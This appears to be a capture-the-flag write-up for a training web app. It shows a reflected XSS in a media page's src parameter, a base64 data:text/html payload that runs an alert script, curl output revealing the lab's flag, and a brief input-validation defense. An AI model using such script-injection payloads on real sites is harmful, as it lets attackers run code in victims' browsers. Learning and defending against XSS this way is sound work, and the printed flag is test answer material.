# Media_xss

## Description

If we go to http://${IP}/index.php?page=media&src=nsa
We see a query parameter src=nsa
If we try to chnage it, our input is processed
We can immagine to send anything in the src param
In fact we find an xss vulerabilitie
An attacker could use this to send urls with the right domain but malicious params to make you think everything you're seeing is legit

## Attack

To attack this we are gonna convert a malicious script with a base64 encoding and it's header to make the browser process it

data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayIpPC9zY3JpcHQ+ 

	$ bash attack.sh
	% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									Dload  Upload   Total   Spent    Left  Speed
	100  2129    0  2129    0     0   199k      0 --:--:-- --:--:-- --:--:-- 1039k
	<center><h2 style="margin-top:50px;"> The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center><table style="margin-top:-68px;"></table>                            </div>

THE FLAG IS : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

## Defense

Restrict the src param to only trusted value and add an input validation before process